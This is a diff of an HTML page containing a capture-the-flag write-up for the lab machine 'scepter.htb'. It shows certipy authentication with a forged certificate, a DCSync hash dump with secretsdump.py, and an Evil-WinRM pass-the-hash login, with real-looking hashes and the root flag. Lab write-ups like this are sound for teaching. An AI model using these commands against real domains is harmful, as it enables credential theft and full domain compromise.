+      <p>I use <strong>certipy</strong> to authenticate with the forged certificate and extract <code>p.adams</code>'s NT hash. Certipy performs PKINIT (Public Key Cryptography for Initial Authentication) against the KDC, which returns a TGT containing the user's PAC. From this, the NT hash can be extracted using the U2U (User-to-User) Kerberos extension — a technique known as <strong>UnPAC-the-Hash</strong>.</p>
       <div class="code-block"><pre><code>certipy auth -pfx d.baker.pfx -username p.adams -domain scepter.htb -dc-ip 10.129.243.90 -debug
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -835,9 +525,8 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved credential cache to &#x27;p.adams.ccache&#x27;
 [*] Trying to retrieve NT hash for &#x27;p.adams&#x27;
 [*] Got hash for &#x27;p.adams@scepter.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0</code></pre></div>
-      <h3 class="writeup-sub-title">DCSync attack</h3>
-      <p>So with the ccache and the NTLM hash, I can now go do a dcsync for dumping the Domain credentials. I can then start using these for Administrator login.
-I will start dumping the hashes by using the following command. DCSync attack will the attack impersonate the AD and can retrieve passwords, hashes, by using specific tools.</p>
+      <h3 class="writeup-sub-title">DCSync</h3>
+      <p>With <code>p.adams</code>'s credentials, I perform a <strong>DCSync attack</strong> using <code>secretsdump.py</code>. DCSync mimics a domain controller's replication behavior to request all user password hashes from the target DC.</p>
       <div class="code-block"><pre><code>KRB5CCNAME=p.adams.ccache secretsdump.py -hashes &#x27;aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0&#x27; -just-dc p.adams@scepter.htb
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -886,39 +575,36 @@ DC01$:aes256-cts-hmac-sha1-96:4da645efa2717daf52672afe81afb3dc8952aad72fc96de3a9
 DC01$:aes128-cts-hmac-sha1-96:a9f8923d526f6437f5ed343efab8f77a
 DC01$:des-cbc-md5:d6923e61a83d51ef
 [*] Cleaning up...</code></pre></div>
-      <h3 class="writeup-sub-title">Privilege Escalation and Domain Admin Access</h3>
-      <p>So now I can start using the administrator hash to log in as Administrator on the windows machine and get the root flag.</p>
+      <h3 class="writeup-sub-title">Administrator Access</h3>
+      <p>I log in as Administrator using the dumped NTLM hash via Evil-WinRM.</p>
       <div class="code-block"><pre><code>evil-winrm -i 10.129.243.90 -u Administrator -H a291ead3493f9773dc615e66c2ea21c4
- 
+                                        
 Evil-WinRM shell v3.7
- 
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline 
- 
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
- 
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline                                                                                                        
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+                                        
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre></div>
-      <div class="flag-box">
-  <span class="flag-label">🚩 Root Flag</span>
-  <code class="flag-value">fa91810e050c4e37f51d743479871262</code>
-</div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
 
 
- Directory: C:\Users\Administrator\Desktop
+    Directory: C:\Users\Administrator\Desktop
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--ar--- 5/8/2025 8:48 PM 34 root.txt
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         5/8/2025   8:48 PM             34 root.txt
 
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
 fa91810e050c4e37f51d743479871262</code></pre></div>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250508222009.png" alt="Pasted image 20250508222009.png" loading="lazy" /><span class="img-caption">Pasted image 20250508222009.png</span></div>
+      <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">fa91810e050c4e37f51d743479871262</code></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250508222009.png" alt="Machine rooted" loading="lazy" /><span class="img-caption">Machine rooted</span></div>
     </div>
   </div>
-
   <script type="text/javascript" src="/bundle.min.js"></script>
 </body>
 </html>
